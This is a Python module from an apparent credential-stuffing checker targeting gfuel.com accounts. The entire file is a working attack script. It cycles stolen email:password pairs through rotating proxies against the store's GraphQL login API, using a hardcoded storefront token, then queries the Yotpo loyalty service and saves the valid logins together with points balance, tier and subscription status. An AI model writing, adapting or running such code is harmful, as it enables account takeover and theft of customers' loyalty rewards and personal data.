from modules.variables import Checker
from modules.functions import return_proxy, set_proxy, log, save, bad_proxy
from requests import Session
from base64 import b64decode
from requests.adapters import HTTPAdapter, Retry
import functools

def check(email:str,password:str):
    while not Checker.stopping:
        try:
            proxy = set_proxy()
            proxy_set = set_proxy(proxy)
            
            with Session() as s:

                s.request = functools.partial(s.request, timeout=Checker.timeout)
                s.proxies.update(proxy_set)
                retries = Retry(total=Checker.retries, backoff_factor=0.1)
                s.mount('http://', HTTPAdapter(max_retries=retries))
                s.mount('https://', HTTPAdapter(max_retries=retries))

                header = {
                    "Host": "gfuel.com" ,
                    "accept": "application/json" ,
                    "x-buy3-sdk-cache-key": "" ,
                    "x-buy3-sdk-cache-fetch-strategy": "NETWORK_FIRST" ,
                    "x-buy3-sdk-expire-timeout": "9223372036854775807" ,
                    "user-agent": "Mobile Buy SDK Android/10.0.1/com.aeron.shopifycore.gfuel" ,
                    "x-sdk-version": "10.0.1" ,
                    "x-sdk-variant": "android" ,
                    "x-shopify-storefront-access-token": "21765aa7568fd627c44d68bde191f6c0",
                    "Content-Type":"application/graphql; charset=utf-8"
                }
                payload = "mutation {customerAccessTokenCreate(input:{email:\""+email+"\",password:\""+password+"\"}){customerAccessToken{accessToken,expiresAt},userErrors{field,message}}}"
                r = s.post("https://gfuel.com/api/2021-07/graphql",data=payload,headers=header)
                if "customerAccessToken\":null" in r.text:
                    Checker.bad += 1
                    return_proxy(proxy)
                    return
                elif "accessToken" not in r.text:
                    raise
                
                token = r.json()["data"]["customerAccessTokenCreate"]["customerAccessToken"]["accessToken"]

                payload = "query {customer(customerAccessToken:\""+token+"\"){createdAt,displayName,email,id,firstName,lastName,phone}}"
                r = s.post("https://gfuel.com/api/2021-07/graphql",data=payload,headers=header).json()
                id = str(b64decode(r["data"]["customer"]["id"].encode()).decode()).split("gid://shopify/Customer/")[-1]

                r = s.get(f"https://loyalty.yotpo.com/api/v1/customer_details?customer_email={email}&customer_external_id={id}&customer_token={token}&merchant_id=33869")
                if r.status_code == 403:
                    raise
                r = r.json()
                points = r.get("points_balance")
                if not points or int(points) <= 19:
                    if not Checker.cui: log("custom",":".join([email,password]),"Gfuel")
                    save("Gfuel","custom",Checker.time,":".join([email,password])+f" | Points: {points}")
                    Checker.custom += 1
                    return_proxy(proxy)
                    return

                name = r.get('name')
                tier = r.get("vip_tier").get("name")
                subscribed = r.get("subscribed")
                if not Checker.cui: log("good",":".join([email,password]),"Gfuel")
                save("Gfuel","good",Checker.time,":".join([email,password])+f" | Name: {name} | Subscribed: {subscribed} | Tier: {tier} | Points: {points}")
                Checker.good += 1
                return_proxy(proxy)
                return
        except:
            bad_proxy(proxy)
            return_proxy(proxy)
            Checker.errors += 1
        
        